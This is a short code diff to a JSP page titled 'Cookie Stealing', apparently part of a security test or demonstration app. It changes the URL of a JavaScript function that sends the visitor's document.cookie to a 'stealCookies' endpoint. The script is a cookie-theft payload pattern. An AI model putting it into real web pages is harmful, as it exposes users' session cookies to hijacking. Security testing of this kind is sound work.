@@ -6,7 +6,7 @@
 <title>Cookie Stealing</title>
 <script type="text/javascript">
 	function test() {
-		document.location = "/painTest/restricted/stealCookies?cookie="
+		document.location = "<%= application.getContextPath() %>/restricted/stealCookies?cookie="
 				+ document.cookie;
 	}
 </script>
